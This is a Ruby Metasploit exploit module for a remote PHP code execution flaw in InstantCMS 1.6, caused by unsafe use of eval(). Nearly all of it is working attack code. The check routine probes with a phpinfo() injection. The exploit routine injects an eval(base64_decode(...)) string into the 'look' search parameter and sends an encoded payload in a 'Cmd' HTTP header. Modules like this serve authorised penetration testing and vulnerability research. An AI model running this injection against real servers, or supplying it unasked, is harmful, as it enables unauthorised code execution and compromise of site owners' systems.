require 'msf/core'


class Metasploit3 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'InstantCMS 1.6 Remote PHP Code Execution',
      'Description'    => %q{
        This module exploits an arbitrary php command execution vulnerability, because of a
        dangerous use of eval(), in InstantCMS versions 1.6.
      },
      'Author'         =>
        [
          'AkaStep', # Vulnerability discovery and PoC
          'Ricardo Jorge Borges de Almeida <ricardojba1[at]gmail.com>', # Metasploit module
          'juan vazquez' # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'BID', '60816' ],
          [ 'URL', 'http://packetstormsecurity.com/files/122176/InstantCMS-1.6-Code-Execution.html' ]
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch' => ARCH_PHP,
      'Targets'        =>
        [
          [ 'InstantCMS 1.6', { }  ],
        ],
      'DisclosureDate' => 'Jun 26 2013',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, "The URI path of the InstantCMS page", "/"])
      ], self.class)
  end

  def check
    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s),
      'vars_get' =>
      {
        'view'  => 'search',
        'query' => '${echo phpinfo()}'
      }
    })

    if res
      if res.body.match(/Build Date/)
        return Exploit::CheckCode::Vulnerable
      else
        return Exploit::CheckCode::Safe
      end
    else
      return Exploit::CheckCode::Unknown
    end

  rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    return Exploit::CheckCode::Unknown
  end

  def exploit

    print_status("Executing payload...")

    res = send_request_cgi({
      'uri'      => normalize_uri(target_uri.to_s),
      'vars_get' =>
      {
        'view'  => 'search',
        'query' => rand_text_alpha(3 + rand(3)),
        'look'  => "#{rand_text_alpha(3 + rand(3))}\",\"\"); eval(base64_decode($_SERVER[HTTP_CMD]));//"
      },
      'headers' => {
        'Cmd' => Rex::Text.encode_base64(payload.encoded)
      }
    })

  end
end
